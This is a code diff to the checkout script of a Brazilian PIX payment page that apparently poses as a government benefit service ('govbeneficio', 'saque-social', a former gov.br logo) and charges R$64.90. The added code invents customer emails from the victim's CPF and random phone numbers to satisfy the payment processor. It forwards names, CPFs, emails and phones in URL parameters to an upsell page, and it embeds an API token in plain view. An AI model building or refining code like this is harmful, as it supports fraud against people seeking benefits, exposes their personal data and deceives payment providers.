@@ -172,8 +172,7 @@ document.head.appendChild(a);
 <body>
 <header>
   <div class="logo">
-    <!-- TROQUE AQUI pela sua logo: coloque o arquivo na pasta images/ -->
-    <img src="images/govbr.png" style="width:90px;margin:10px;" alt="Logo">
+    <img src="images/logo.png" style="width:90px;margin:10px;" alt="Logo">
   </div>
   <div class="icons">
     <button><i class="fas fa-ellipsis-v"></i></button>
@@ -278,16 +277,10 @@ document.head.appendChild(a);
 <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async defer></script>
 <script src="https://checkout.mangofy.com.br/js/new/fast_api.min.js?key=vstmvkxe-6e3a42e3-3c50-48ff-a052-c566cdc1f21e" id="pix-sdk-script"></script>
 <script>
-  /* ══════════════════════════════════════════════════════════════
-     CONFIGURAÇÕES
-     ══════════════════════════════════════════════════════════════ */
   var PIX_VALOR_CENTS   = 6490;
   var PIX_DESCRICAO     = 'Front';
   var PIX_REDIRECT      = 'https://govbeneficio.vercel.app/up1.html';
-
-  /* ── HASH DO PRODUTO (UTMify) ── */
   var PARADISE_PRODUCT_HASH = 'prod_7333c0ff75106325';
-  /* ── CREDENCIAL DA API UTMIFY ── */
   var UTMIFY_API_TOKEN = 'hLLRiNJhaIzqdivrzVY7PLr1zH3sia014pMW';
 
   var _pixCode='',_pixPaymentCode='',_pixQRFeito=false,_checkoutDisparado=false;
@@ -298,7 +291,6 @@ document.head.appendChild(a);
   var _email=(_p.get('email')||'cliente@email.com').trim();
   var _fone=(_p.get('telefone')||'11999999999').replace(/\D/g,'');
 
-  /* ── CAPTURA DE PARÂMETROS UTM ── */
   var _utm_source   = _p.get('utm_source')   || '';
   var _utm_medium   = _p.get('utm_medium')   || '';
   var _utm_campaign = _p.get('utm_campaign') || '';
@@ -308,7 +300,6 @@ document.head.appendChild(a);
   var _src          = _p.get('src')          || '';
   var _sck          = _p.get('sck')          || '';
 
-  /* ── FORMATA DATA NO PADRÃO UTMIFY ── */
   function utmifyFmtDate(d) {
     return d.getFullYear() + '-' +
       String(d.getMonth()+1).padStart(2,'0') + '-' +
@@ -363,17 +354,11 @@ document.head.appendChild(a);
           utm_content:  _utm_content,
           utm_term:     _utm_term
         },
-        trackingParameters: {
-          src: _src,
-          sck: _sck
-        }
+        trackingParameters: { src: _src, sck: _sck }
       };
       await fetch('https://api.utmify.com.br/api-credentials/orders', {
         method:  'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'x-api-token':  UTMIFY_API_TOKEN
-        },
+        headers: { 'Content-Type': 'application/json', 'x-api-token': UTMIFY_API_TOKEN },
         body: JSON.stringify(body)
       });
     } catch(e) {}
@@ -382,12 +367,10 @@ document.head.appendChild(a);
   function utmRedirectUrl() {
     var base = PIX_REDIRECT;
     var params = [];
-    /* Dados do cliente para o upsell */
     if (_nome)  params.push('nome='     + encodeURIComponent(_nome));
     if (_cpf)   params.push('cpf='      + encodeURIComponent(_cpf));
     if (_email) params.push('email='    + encodeURIComponent(_email));
     if (_fone)  params.push('telefone=' + encodeURIComponent(_fone));
-    /* UTMs */
     if (_utm_source)   params.push('utm_source='   + encodeURIComponent(_utm_source));
     if (_utm_medium)   params.push('utm_medium='   + encodeURIComponent(_utm_medium));
     if (_utm_campaign) params.push('utm_campaign=' + encodeURIComponent(_utm_campaign));
@@ -402,26 +385,14 @@ document.head.appendChild(a);
 
   function formatarNome(n){if(!n)return '';return n.toLowerCase().split(' ').filter(Boolean).map(function(w){return w.charAt(0).toUpperCase()+w.slice(1);}).join(' ');}
   function formatarCPF(c){return c.replace(/\D/g,'').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4');}
-  function gerarProtocolo(){return new Date().getFullYear()+'.'+Math.floor(Math.random()*900000+100000)+'.'+Math.floor(Math.random()*9000+1000);}
-
+  
   function gerarEmailAleatorio() {
-    var prefixos = ['contato','usuario','cliente','pagador','comprador','pessoa','acesso','membro'];
-    var dominios = ['gmail.com','hotmail.com','outlook.com','yahoo.com.br','icloud.com'];
-    var prefixo  = prefixos[Math.floor(Math.random()*prefixos.length)];
-    var numero   = Math.floor(Math.random()*9000+1000);
-    var dominio  = dominios[Math.floor(Math.random()*dominios.length)];
-    return prefixo + numero + '@' + dominio;
+    var s = (_cpf||'').replace(/\D/g,'').slice(-8);
+    return 'cpf'+s+Math.floor(Math.random()*100)+'@gmail.com';
   }
-
   function gerarFoneAleatorio() {
-    var ddds = ['11','12','13','14','15','16','17','18','19','21','22','24','27','28',
-                '31','32','33','34','35','37','38','41','42','43','44','45','46','47',
-                '48','49','51','53','54','55','61','62','63','64','65','66','67','68',
-                '69','71','73','74','75','77','79','81','82','83','84','85','86','87',
-                '88','89','91','92','93','94','95','96','97','98','99'];
-    var ddd    = ddds[Math.floor(Math.random()*ddds.length)];
-    var numero = '9' + String(Math.floor(Math.random()*90000000+10000000));
-    return ddd + numero;
+    var ddds = ['11','21','31','41','47','48','51','61','71','81','85'];
+    return ddds[Math.floor(Math.random()*ddds.length)] + (Math.floor(10000000+Math.random()*90000000));
   }
 
   var nomeOk=formatarNome(_nome);
@@ -434,12 +405,8 @@ document.head.appendChild(a);
   function ttqAddPaymentInfo(){try{ttq.track('AddPaymentInfo',ttqConteudo());}catch(e){}}
   function ttqPurchase(){try{ttq.track('Purchase',{content_id:'saque-social',content_name:PIX_DESCRICAO,content_type:'product',currency:'BRL',value:parseFloat((PIX_VALOR_CENTS/100).toFixed(2)),quantity:1,transaction_id:String(_pixPaymentCode)});}catch(e){}}
 
-  /* ══════════════════════════════════════════════════════════════
-     CACHE DO PIX — salva no localStorage para persistir entre reloads
-     Expira em 24h (mesmo tempo do PIX na Mangofy: expires_in_days: 1)
-     ══════════════════════════════════════════════════════════════ */
   var PIX_CACHE_KEY = 'pix_cache_' + (_cpf || 'guest');
-  var PIX_EXPIRA_MS = 10 * 60 * 1000; /* 10 minutos */
+  var PIX_EXPIRA_MS = 10 * 60 * 1000;
 
   function pixSalvarCache(pixCode, qrImage, paymentCode){
     try {
@@ -457,7 +424,6 @@ document.head.appendChild(a);
       var raw = localStorage.getItem(PIX_CACHE_KEY);
       if(!raw) return null;
       var cache = JSON.parse(raw);
-      /* Verifica se expirou */
       if(Date.now() - cache.criadoEm > PIX_EXPIRA_MS){
         localStorage.removeItem(PIX_CACHE_KEY);
         return null;
@@ -470,9 +436,6 @@ document.head.appendChild(a);
     try { localStorage.removeItem(PIX_CACHE_KEY); } catch(e){}
   }
 
-  /* ══════════════════════════════════════════════════════════════
-     EXIBE O PIX NA TELA (usado tanto pelo cache quanto pelo novo)
-     ══════════════════════════════════════════════════════════════ */
   function pixExibir(pixCode, qrImage){
     _pixCode = pixCode || '';
     var valorFmt = 'R$ ' + (PIX_VALOR_CENTS/100).toFixed(2).replace('.',',');
@@ -482,7 +445,6 @@ document.head.appendChild(a);
     document.getElementById('pix-valor-topo').textContent  = valorFmt;
     document.getElementById('pix-code-box').textContent    = _pixCode || 'Código indisponível — use o QR Code';
 
-    /* QR Code */
     var wrap = document.getElementById('pix-qr-img'); wrap.innerHTML = '';
     var imgEl = document.createElement('img');
     if(qrImage){
@@ -499,14 +461,10 @@ document.head.appendChild(a);
     document.getElementById('pix-main').style.display    = 'block';
   }
 
-  /* ══════════════════════════════════════════════════════════════
-     CRIA COBRANÇA PIX VIA MANGOFY SDK (generatePix)
-     ══════════════════════════════════════════════════════════════ */
   var _pixGerando = false;
   var _pixUltimaReq = 0;
 
   async function pixIniciar(){
-    /* 1) Tenta restaurar do cache primeiro */
     var cache = pixLerCache();
     if(cache && cache.pixCode){
       _pixCreatedAt = utmifyFmtDate(new Date(cache.criadoEm));
@@ -516,7 +474,6 @@ document.head.appendChild(a);
       return;
     }
 
-    /* 2) Bloqueia cliques repetidos e rate limit */
     if(_pixGerando) return;
     var agora = Date.now();
     var espera = 10000;
@@ -538,8 +495,18 @@ document.head.appendChild(a);
     ttqIdentify();
 
     try {
+      var emailConfig = (_email && _email.indexOf('@') > 0) ? _email : gerarEmailAleatorio();
+      var phoneConfig = _fone || gerarFoneAleatorio();
+      var nomeEnvio = nomeOk || 'Cliente Pagador';
+      
       var config = {
         total_price: PIX_VALOR_CENTS / 100,
+        customer: {
+            name: nomeEnvio,
+            document: _cpf || '',
+            email: emailConfig,
+            phone: phoneConfig
+        },
         items: [
           { name: PIX_DESCRICAO, price: PIX_VALOR_CENTS / 100, quantity: 1 }
         ]
@@ -552,7 +519,6 @@ document.head.appendChild(a);
       _pixPaymentCode = response.paymentCode || '';
       _pixCreatedAt   = utmifyFmtDate(new Date());
 
-      /* Salva no cache para persistir entre reloads */
       pixSalvarCache(_pixCode, response.qrCodeImage, _pixPaymentCode);
 
       pixExibir(_pixCode, response.qrCodeImage);
@@ -571,10 +537,6 @@ document.head.appendChild(a);
     }
   }
 
-  /* ══════════════════════════════════════════════════════════════
-     CALLBACK AUTOMÁTICO DA MANGOFY — chamado pelo SDK quando
-     o pagamento é aprovado
-     ══════════════════════════════════════════════════════════════ */
   async function paymentApproved(){
     pixLimparCache();
     ttqPurchase();
